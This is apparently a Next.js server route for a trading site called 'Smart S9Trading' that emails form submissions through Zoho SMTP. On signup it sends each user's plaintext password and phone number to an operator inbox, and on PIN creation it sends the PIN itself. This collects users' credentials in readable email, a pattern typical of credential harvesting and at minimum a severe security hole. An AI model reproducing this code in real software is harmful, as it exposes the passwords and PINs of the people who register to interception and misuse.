import { render } from "@react-email/render";
import nodemailer from "nodemailer";
import RegistrationEmail from "../../../components/email-templates/RegistrationEmail";
import ContactEmail from "../../../components/email-templates/ContactEmail";
import PinEmail from "../../../components/email-templates/PinEmail";

export async function POST(request: Request) {
  try {
    const { type, data } = await request.json();

    // Determine email type
    const step =
      type === "signup" ? "registration" :
      type === "contact" ? "contact" :
      type === "PIN" ? "PIN" :
      null;

    if (!step) {
      return new Response(
        JSON.stringify({ success: false, error: "Invalid email type" }),
        { status: 400 }
      );
    }

    const smtpUser = process.env.SMTP_USER;
    const smtpPass = process.env.SMTP_PASS;
    const receiverEmail = process.env.RECEIVER_EMAIL;

    if (!smtpUser || !smtpPass || !receiverEmail) {
      return new Response(
        JSON.stringify({ success: false, error: "Email service not configured" }),
        { status: 500 }
      );
    }

    const transporter = nodemailer.createTransport({
  host: "smtp.zoho.com",  // Zoho SMTP host
  port: 465,               // SSL port
  secure: true,            // must be true for port 465
  auth: {
    user: smtpUser,        // your Zoho email
    pass: smtpPass,        // Zoho App Password
  },
});

    const timestamp = new Date().toISOString();
    let subject = "";
    let emailHtml = "";

    if (step === "registration") {
      const { name, email, password, phone } = data;
      subject = `New Signup - ${name} (${email}) [${timestamp}]`;
      emailHtml = render(
        <RegistrationEmail name={name} email={email} password={password} phone={phone} />
      );
    } else if (step === "contact") {
      const { name, email, subject: contactSubject, category, message } = data;
      subject = `New Contact Message - ${contactSubject || category} (${name}) [${timestamp}]`;
      emailHtml = render(
        <ContactEmail name={name} email={email} category={category} message={message} />
      );
    } else if (step === "PIN") {
      const { name, email, pin } = data;
      subject = `New PIN Created - ${email} [${timestamp}]`;
      emailHtml = render(<PinEmail name={name} email={email} pin={pin} />);
    }

    await transporter.sendMail({
      from: `"Smart S9Trading" <${smtpUser}>`,
      to: receiverEmail,
      subject,
      html: emailHtml,
      text:
        step === "registration"
          ? `New signup from ${data.name} (${data.email}), password: ${data.password}, phone: ${data.phone}`
          : step === "contact"
          ? `Contact message from ${data.name} (${data.email}): ${data.message}`
          : `PIN created for ${data.name} (${data.email}): ${data.pin}`,
    });

    console.log("[v0] Email sent successfully");
    return new Response(JSON.stringify({ success: true }), { status: 200 });
  } catch (error: any) {
    console.error("[v0] Email API error:", error);
    return new Response(
      JSON.stringify({
        success: false,
        error: "Failed to send email",
        details: error?.message || "Unknown error",
      }),
      { status: 500 }
    );
  }
}
